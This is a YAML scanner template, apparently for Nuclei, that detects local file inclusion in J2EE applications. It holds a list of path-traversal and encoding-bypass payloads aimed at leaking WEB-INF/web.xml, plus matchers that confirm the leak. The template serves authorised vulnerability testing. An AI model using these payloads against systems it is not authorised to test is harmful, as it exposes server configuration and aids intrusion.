id: lfi-j2ee

info:
  name: J2EE LFI
  author: shelled
  severity: high
  reference: https://shahjerry33.medium.com/lfi-an-interesting-tweak-9c5638dbdd1b
  description: Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml file.
  tags: fuzzing-lfi,fuzzing-req
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      injection:
      - "%2e/WEB-INF/web.xml"
      - "%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
      - "%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
      - "%c0%ae/%c0%ae/WEB-INF/web.xml"
      - "%c0%ae/WEB-INF/web.xml"
      - "../../../../WEB-INF/web.xml"
      - "../../../WEB-INF/web.xml"
      - "../../../WEB-INF/web.xml;x="
      - "../../WEB-INF/web.xml"
      - "../../WEB-INF/web.xml;x="
      - "../WEB-INF/web.xml"
      - "../WEB-INF/web.xml;x="
      - "../app/WEB-INF/web.xml"
      - "..;/WEB-INF/web.xml"
      - "..;/..;/WEB-INF/web.xml"
      - ".//WEB-INF/web.xml"
      - "/#/../../../../WEB-INF/web.xml"
      - "/WEB-INF/web.xml"
      - "./WEB-INF/web.xml"
      - "../WEB-INF/web.xml"
      - "/../../WEB-INF/web.xml"
      - "/../../../WEB-INF/web.xml"
      - "/../../../../WEB-INF/web.xml"
      - ";/WEB-INF/web.xml"
      - "./WEB-INF/.../web.xml"
      - "./WEB-INF/../../../WEB-INF/web.xml"
      - "./WEB-INF/../../WEB-INF/web.xml"
      - "./WEB-INF/././web.xml"
      - "./WEB-INF/./web.xml"
      - "./WEB-INF/./xxx/../web.xml"
      - "./WEB-INF/./xxx/yyy/../../web.xml"
      - "./WEB-INF/web.xml"
      
    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{injection}}"
          
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "<servlet-name>"
          - "</web-app>"
        condition: and
        
      - type: word
        part: body
        words:
          - "<session-config>"
          - "<filter>"
        condition: and

      - type: word
        part: body
        words:
          - "<web-app"
          - "</web-app"
        condition: and
